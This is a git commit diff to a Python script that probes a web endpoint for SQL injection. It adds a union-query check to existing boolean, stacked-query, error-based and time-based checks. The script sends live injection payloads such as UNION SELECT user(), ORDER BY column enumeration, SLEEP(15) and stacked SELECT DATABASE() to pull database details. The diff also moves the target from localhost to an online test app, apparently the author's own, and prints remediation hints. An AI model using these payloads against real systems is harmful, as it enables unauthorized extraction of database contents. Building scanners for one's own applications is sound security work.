97b14bfd318d751d65523e38d219357e856d6afe
Zhiyuan Yang <zhiyuanyang0@gmail.com>
2017-08-12 16:08:48 -0700

    Add union-query based sql injection check.

--- tool/experiment.py
+++ tool/experiment.py
@@ -4,7 +4,6 @@ import sys
 import urllib2
 import httplib
 import json as js
-# from datetime import datetime
 import time
 import requests
 
@@ -16,7 +15,7 @@ def check_boolean_based_attack(url):
         f = opener.open(url + e)
         if f.getcode() == 200:
             res = js.loads(f.read())
-            print "This web server is vulnerable for boolean based attack."
+            print "This web server is vulnerable for boolean based sql injection attack."
             print "The response after boolean attack is:"
             print res
             print
@@ -28,7 +27,9 @@ def check_stack_query(url):
     opener = urllib2.build_opener()
     f = opener.open(req)
     database = js.loads(f.read())
-    print "This web server is vulnerable for Stacked Queries(Piggy Backing)."
+    print "This web server is vulnerable for Stacked Queries(Piggy Backing) sql injection attack. " \
+          "This is the most dangerous sql injection attack type." \
+          "The suggestion is to close multiple query or check the user input."
     print "The Database's name is: "
     print database[1][0]['DATABASE()'] + "\n"
 
@@ -41,42 +42,65 @@ def check_stack_query(url):
     print
 
 
-def check_time_based_attack(url):
-    arr = ["'%20AND%20SLEEP(15);%20--%20", "\"%20AND%20SLEEP(15);%20--%20", "%20AND%20SLEEP(15);%20--%20"]
-    for e in arr:
-        a = time.time()
-        opener = urllib2.build_opener()
-        f = opener.open(url + e)
-        b = time.time()
-        duration = b - a
-        if duration > 13:
-            print "This web server is vulnerable for time based attack."
-            print "The response time after boolean attack SLEEP(15) is: " + str(duration) + "\n"
-
-
 def check__error_based_attack(url):
     for i in range(1, 1000):
         newUrl = url + "'%20ORDER%20BY%20" + str(i) + "%3B--%20"
         r = requests.get(newUrl)
-        # print r.content
-        # print r.status_code
-        # print r.content.find("ER_BAD_FIELD_ERROR") != -1
         if r.status_code != 200 and r.content.find("ER_BAD_FIELD_ERROR") != -1:
-            print "This web server is potentially vulnerable for error based attack. " \
+            print "This web server is potentially vulnerable for error based sql injection attack. " \
                   "The suggestion is do not exposed detailed database error to the public."
             print "The error message is:"
             print r.content
             print
             break
 
+
+def check_union_query_based_attack(url):
+    number = 1
+    for i in range(1, 1000):
+        newUrl = url + "'%20UNION%20SELECT%20"
+        for j in range(1, i):
+            newUrl += str(j)
+            if j != i - 1:
+                newUrl += ","
+        newUrl += ";--%20"
+        r = requests.get(newUrl)
+        if r.status_code == 200:
+            number = i - 1
+            break
+        if i == 999:
+            print "We didn't find any union-query based database vulnerabilities in this security check."
+    newUrl = url + "'%20UNION%20SELECT%20"
+    for j in range(1, number):
+        newUrl += str(j) + ","
+    newUrl += "user();--%20"
+    r = requests.get(newUrl)
+    print "This web server is vulnerable for union-query based sql injection attack."
+    print "The response we get from the web might include the database user information:"
+    print r.content
+    print
+
+
+def check_time_based_attack(url):
+    arr = ["'%20AND%20SLEEP(15);%20--%20", "\"%20AND%20SLEEP(15);%20--%20", "%20AND%20SLEEP(15);%20--%20"]
+    for e in arr:
+        a = time.time()
+        r = requests.get(url + e)
+        b = time.time()
+        duration = b - a
+        if duration > 13:
+            print "This web server is vulnerable for time based sql injection attack."
+            print "The response time after boolean attack SLEEP(15) is: " + str(duration) + "\n"
+
+
 online = "https://my-securitytest.herokuapp.com/getFriend/user1"
 local = "http://localhost:3000/getFriend/user1"
 
-check_boolean_based_attack(local)
-check_stack_query(local)
-check__error_based_attack(local)
-
-# check_time_based_attack(local)
+check_boolean_based_attack(online)
+check_stack_query(online)
+check__error_based_attack(online)
+check_union_query_based_attack(online)
+check_time_based_attack(online)
 
 # localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
 # localhost:3000/getFriend/user1'; SHOW TABLES; --%20
